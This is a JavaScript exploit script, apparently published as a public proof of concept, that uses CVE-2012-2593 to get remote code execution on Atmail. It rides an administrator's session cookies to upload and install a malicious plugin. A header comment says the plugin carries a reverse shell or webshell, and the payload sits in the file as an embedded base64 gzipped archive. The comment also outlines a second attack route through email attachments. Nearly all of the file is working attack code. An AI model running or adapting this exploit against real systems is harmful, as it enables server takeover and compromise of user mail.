///////////////////////////////////////////////////////////////////////////////////
//                  **-- Atmail RCE From CVE-2012-2593 --**                      //
//                                                                               //
// Leverages CVE-2012-2593 to obtain remote code execution via the "install      //
// plugin" functionality of atmail admin webpanel.                               //
//                                                                               //
// Copyright (c) 2021 Andrew Trube  <https://github.com/AndrewTrube>             //
//                                                                               //
// Permission is hereby granted, free of charge, to any person obtaining a copy  //
// of this software and associated documentation files (the "Software"), to deal //
// in the Software without restriction, including without limitation the rights  //
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     //
// copies of the Software, and to permit persons to whom the Software is         //
// furnished to do so, subject to the following conditions:                      //
//                                                                               //
// The above copyright notice and this permission notice shall be included in all//
// copies or substantial portions of the Software.                               //
//                                                                               //                                              
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    //
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      //
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   //
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        //
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, //
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE //
// SOFTWARE.                                                                     //
//                                                                               //
///////////////////////////////////////////////////////////////////////////////////

/******
CODE EXEC PATH THROUGH PLUGIN functionionality
1. Write PHP Plugin class extension for Atmail_Controller_Plugin w/ a reverse shell or webshell as the setup() function
2. GZIP then BASE64 encode the gzipped data
3. Send and install plugin as XHR request spoofing admin

OTHER ATTACK PATH THROUGH Email Attachments:
4. send request to change global variable for tmp folder
5. send email with php attachment
******/

//Send the post request which installs the plugin, with the admin's cookies
function a(d) {
  let url = 'http://atmail/index.php/admin/plugins/preinstall'; // change this to target url
  let xhr = new XMLHttpRequest();
  
  xhr.open("POST",url,true);
  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------24036307103959597712452882034");
  xhr.withCredentials = true;
    
  xhr.send(d);
}

//Setup and properly encode the body of the POST request
function b() {

/* gzipped and b64 encoded Plugin.php file*/
  let data = "H4sIAAAAAAAAA+2Ua0/bMBSG+zm/4ghVa5EgidO0HZcWMejEJAaI27RPUeoaYpHalu1o6xD/fXbKYJPaMWmwadp52tiN/frk5Lx2laRR44WJHf1u1/ek342/77/RICmJSaefxv20EZM46SUN6L50Yp7K2FwDNG7ykv9M99T8P4py/o91VbzkJvhl/7tpJyFunBDfof9/gAf/T8rqmotQFerZn+EN7qXpMv9JGieP/sd953+H+PMfP3smC/jP/d/ecY4HAS1zY8Bthsxvhmy+GYB9tkxMDOzaac7LbE8Kq2VZMn0vCG6DAEBpaRm1bALNTNXjb6uyPMqnDAbQeuPitbYWyvaZoZory6WolacXB0uUe1LNNL8urNc93uwV+aRuSvpldrNk7YUu/arCWrUZRaYQoRzzSH0SbLJkxZEbME9kdMm0uc+7H7rP0sSnKq+z7oUk7C5RvZeTqqyr5evsRV5WjUtO4aoStK5QllEpjNUVte1VuHUKp8k1E3Zz84e5rXqqaQtu1ocLS73iXwzenZ/BLpyOLkenZyM4OxgdHsL5MZx8OIKPxxcrPsydCxQsyMUwW6mHLJpG0pvBlW+lYqLdIhtJSHqvQ0I2QtJJW2vu/zwhq1sQRbTIxTUDWzDgCnIxqX8qqS1cSQ0zWWmY5rTggs1jKz1wBaPZPHI05sJ5COsctl91YOiuxDWttVzrfNbuDIZ1MqtrTcUVM+6R8zr5CLSUhrVdwLpCd0HgvjvD4G+fQARBEARBEARBEARBEARBEARBEARBEAT5fb4CzCJaLwAoAAA=";
  
  let message = "-----------------------------24036307103959597712452882034\r\n" +
    `Content-Disposition: form-data; name="newPlugin"; filename="poc.tgz"\r\n` +
    "Content-Type: application/gzip\r\n\r\n" +
    atob(data) + "\r\n" +
    "-----------------------------24036307103959597712452882034--\r\n";
    
  let byteArray = new Uint8Array(message.length);
  
  for (x = 0; x < byteArray.length; x++) {
    byteArray[x] = message.charCodeAt(x);
  }

  return byteArray;
}


//Trigger malicious Plugin.php
function c() {
  let url = 'http://atmail/index.php/admin/plugins/add/file/cG9jLnRneg=='; // base64 encoded filename (poc.tgz)
  let xhr = new XMLHttpRequest();
  
  xhr.open('GET',url,true);
  xhr.setRequestHeader("Accept"," */*");
  xhr.setRequestHeader("Accept-Language"," en-US,en;q=0.5");

  xhr.withCredentials = true;
  xhr.send(null);
}

//Sleep function to wait for Plugin's installation to finish on the webserver
function sleep(milliseconds) {
  const start = Date.now();
  while (Date.now() - start < milliseconds);
}

d = b();
a(d);
sleep(2000);
c();
